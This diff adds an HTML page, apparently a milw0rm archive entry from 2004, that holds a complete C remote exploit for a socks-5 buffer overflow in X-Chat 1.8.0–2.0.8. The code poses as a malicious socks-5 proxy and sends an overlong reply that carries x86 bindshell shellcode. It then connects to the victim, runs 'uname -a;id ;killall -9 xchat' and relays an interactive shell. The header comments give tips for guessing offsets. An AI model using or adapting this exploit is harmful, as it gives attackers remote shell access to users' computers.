@@ -1,0 +1,211 @@
+<html>
+<head>
+<title>XChat 1.8.0/2.0.8 socks5 Remote Buffer overflow Exploit
+</title>
+<pre>
+/*[ X-Chat[v1.8.0 - v2.0.8]: socks-5 remote buffer overflow exploit. ]                         *
+ *                                                                                                                        *
+ * by: vade79/v9 v9 fakehalo deadpig org (fakehalo/realhalo)                                   *
+ *                                                                                                                        *
+ * X-Chat homepage:                                                                                            *
+ *  http://www.xchat.org                                                                                         *
+ *                                                                                                                        *
+ * compile:                                                                                                           *
+ *  cc xxchat-socks5.c -o xxchat-socks5                                                                   *
+ *                                                                                                                        *
+ * trigger bug/workings(X-Chat socks-5 comminucation):                                           *
+ *  0x05,0x00                                                                                                       *
+ *  0x05,0x00,0x00,0x03                                                                                       *
+ *  0x?? (the size of the following &quot;data&quot;, 255MAX(char/int8))                                     *
+ *  0x??,0x??,0x?? ... (&quot;data&quot;)                                                                                *
+ *                                                                                                                        *
+ *  ie. &quot;\x05\x00\x05\x00\x00\x03\xffxxxxxxxxxxxxxxxxxxxxxxxxxxxx...&quot;               *
+ *                                                                                                                        *
+ * the &quot;data&quot;, limited by the previous byte, is then copied into a                                 *
+ * 10 byte buffer labeled buf[].  the idea is to set the size of                                     *
+ * the incoming data to a larger size than expected(ie. 0xff/255MAX),                         *
+ * followed by sending that amount of data to exceed the 10 byte                              *
+ * buffer boundary and overwrite memory addresses(stack based).                             *
+ *                                                                                                                        *
+ * the problem with the size limit is that it is defined in one                                        *
+ * character(char/int8), making a maximum of up to 255 bytes to be                          *
+ * written to buf[].  so, this only leaves about ~100+ nops breathing                           *
+ * room per offset.  another problem is that the location of the                                   *
+ * shellcode depends on where/what X-Chat has already done.  those                          *
+ * two things together make for a very unpractical &quot;in the wild&quot;                                    *
+ * exploit scenario.                                                                                                *
+ *                                                                                                                        *
+ * i just saw several cryptic advisories about this bug, so i figured                                *
+ * i would look into it and see exactly what it was.                                                      *
+ *                                                                                                                        *
+ * if X-Chat attempts to connect to a server(through socks-5)                                     *
+ * immediately upon the start of X-Chat(&quot;autoconnect&quot;) it will make                            *
+ * the shellcode location a bit easier to find.  on both source                                      *
+ * compiled version 1.8.0(on rh7.1) and mandrake's rpm static binary                         *
+ * version 2.0.5(on mdk9.1) an offset of 2600 worked.                                              *
+ *                                                                                                                        *
+ * note: the first thing that is sent to the bindshell, upon                                           *
+ * successful exploitation, is &quot;killall -9 xchat&quot;.  this will kill                                          *
+ * X-Chat, but still keep the bindshell alive/active.  when searching                             *
+ * for the correct offset, use increments of 100(100,200,300,...).                                *
+ **********************************************************************/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#define BUFSIZE 255
+#define BSEADDR 0xbffffffa
+#define DFLPORT 1080
+#define DFLSPRT 7979
+#define TIMEOUT 5
+static char x86_exec[]= /* bindshell(??), netric based. */
+ &quot;\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66&quot;
+ &quot;\xcd\x80\x31\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89&quot;
+ &quot;\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89&quot;
+ &quot;\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52&quot;
+ &quot;\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80&quot;
+ &quot;\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68&quot;
+ &quot;\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd&quot;
+ &quot;\x80&quot;;
+char *getcode(unsigned int);
+char *socks5_bind(unsigned short,unsigned int);
+void getshell(char *,unsigned short);
+void printe(char *,short);
+void sig_alarm(){printe(&quot;alarm/timeout hit.&quot;,1);}
+int main(int argc,char **argv){
+ unsigned short port=DFLPORT,sport=DFLSPRT;
+ unsigned int retaddr=BSEADDR;
+ char *hostptr;
+ if(BUFSIZE&lt;0||BUFSIZE&gt;255)printe(&quot;BUFSIZE must be 1-255(char/int8).&quot;,1);
+ printf(&quot;[*] X-Chat[v1.8.0-v2.0.8]: socks-5 remote buffer overflow exp&quot;
+ &quot;loit.\n[*] by: by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n\n&quot;);
+ if(argc&lt;2){
+  printf(&quot;[!] syntax: %s &lt;offset from 0x%.8x&gt; [port] [shell port]\n\n&quot;,
+  argv[0],BSEADDR);
+  exit(1);
+ }
+ if(argc&gt;1)retaddr-=atoi(argv[1]);
+ if(argc&gt;2)port=atoi(argv[2]);
+ if(argc&gt;3)sport=atoi(argv[3]);
+ x86_exec[20]=(sport&amp;0xff00)&gt;&gt;8;
+ x86_exec[21]=(sport&amp;0x00ff);
+ printf(&quot;[*] eip: 0x%.8x, socks-5 port: %u, bindshell port: %u.\n&quot;,
+ retaddr,port,sport);
+ hostptr=socks5_bind(port,retaddr);
+ sleep(1);
+ getshell(hostptr,sport);
+ exit(0);
+}
+char *getcode(unsigned int retaddr){
+ unsigned char i=0;
+ char *buf;
+ if(!(buf=(char *)malloc(BUFSIZE+1)))
+  printe(&quot;getcode(): allocating memory failed.&quot;,1);
+ memset(buf,0x90,BUFSIZE);
+ for(i=0;i&lt;64;i+=4){*(long *)&amp;buf[i]=retaddr;}
+ memcpy((buf+BUFSIZE-strlen(x86_exec)),x86_exec,strlen(x86_exec));
+ return(buf);
+}
+char *socks5_bind(unsigned short port,unsigned int retaddr){
+ int ssock=0,sock=0,so=1;
+ socklen_t salen=0;
+ unsigned char *buf;
+ struct sockaddr_in ssa,sa;
+ ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+ setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&amp;so,sizeof(so));
+#ifdef SO_REUSEPORT
+ setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&amp;so,sizeof(so));
+#endif
+ ssa.sin_family=AF_INET;
+ ssa.sin_port=htons(port);
+ ssa.sin_addr.s_addr=INADDR_ANY;
+ printf(&quot;[*] awaiting connection from: *:%d.\n&quot;,port);
+ if(bind(ssock,(struct sockaddr *)&amp;ssa,sizeof(ssa))==-1)
+  printe(&quot;could not bind socket.&quot;,1);
+ listen(ssock,2);
+ bzero((char*)&amp;sa,sizeof(struct sockaddr_in));
+ salen=sizeof(sa);
+ sock=accept(ssock,(struct sockaddr *)&amp;sa,&amp;salen);
+ close(ssock);
+ printf(&quot;[*] socks-5 server connection established.\n&quot;);
+ if(!(buf=(unsigned char *)malloc(BUFSIZE+7+1)))
+  printe(&quot;socks5_bind(): allocating memory failed.&quot;,1);
+ memcpy(buf,&quot;\x05\x00\x05\x00\x00\x03&quot;,6);
+ buf[6]=BUFSIZE;
+ memcpy(buf+7,getcode(retaddr),BUFSIZE);
+ printf(&quot;[*] sending specially crafted string. (exploit)\n&quot;);
+ write(sock,buf,BUFSIZE+7);
+ free(buf);
+ sleep(1);
+ close(sock);
+ printf(&quot;[*] socks-5 server connection closed.\n&quot;);
+ return(inet_ntoa(sa.sin_addr));
+}
+void getshell(char *hostname,unsigned short port){
+ int sock,r;
+ fd_set fds;
+ char buf[4096+1];
+ struct hostent *he;
+ struct sockaddr_in sa;
+ printf(&quot;[*] checking to see if the exploit was successful.\n&quot;);
+ if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+  printe(&quot;getshell(): socket() failed.&quot;,1);
+ sa.sin_family=AF_INET;
+ if((sa.sin_addr.s_addr=inet_addr(hostname))){
+  if(!(he=gethostbyname(hostname)))
+   printe(&quot;getshell(): couldn't resolve.&quot;,1);
+  memcpy((char *)&amp;sa.sin_addr,(char *)he-&gt;h_addr,
+  sizeof(sa.sin_addr));
+ }
+ sa.sin_port=htons(port);
+ signal(SIGALRM,sig_alarm);
+ alarm(TIMEOUT);
+ printf(&quot;[*] attempting to connect: %s:%d.\n&quot;,hostname,port);
+ if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa))){
+  printf(&quot;[!] connection failed: %s:%d.\n&quot;,hostname,port);
+  return;
+ }
+ alarm(0);
+ printf(&quot;[*] successfully connected: %s:%d.\n\n&quot;,hostname,port);
+ signal(SIGINT,SIG_IGN);
+ write(sock,&quot;uname -a;id ;killall -9 xchat\n&quot;,30);
+ while(1){
+  FD_ZERO(&amp;fds);
+  FD_SET(0,&amp;fds);
+  FD_SET(sock,&amp;fds);
+  if(select(sock+1,&amp;fds,0,0,0)&lt;1)
+   printe(&quot;getshell(): select() failed.&quot;,1);
+  if(FD_ISSET(0,&amp;fds)){
+   if((r=read(0,buf,4096))&lt;1)
+    printe(&quot;getshell(): read() failed.&quot;,1);
+   if(write(sock,buf,r)!=r)
+    printe(&quot;getshell(): write() failed.&quot;,1);
+  }
+  if(FD_ISSET(sock,&amp;fds)){
+   if((r=read(sock,buf,4096))&lt;1)
+    exit(0);
+   write(1,buf,r);
+  }
+ }
+ close(sock);
+ return;
+}
+void printe(char *err,short e){
+ printf(&quot;[!] %s\n&quot;,err);
+ if(e)exit(1);
+ return;
+}
+
+
+// milw0rm.com [2004-05-05]
+</pre>
+</html>
+
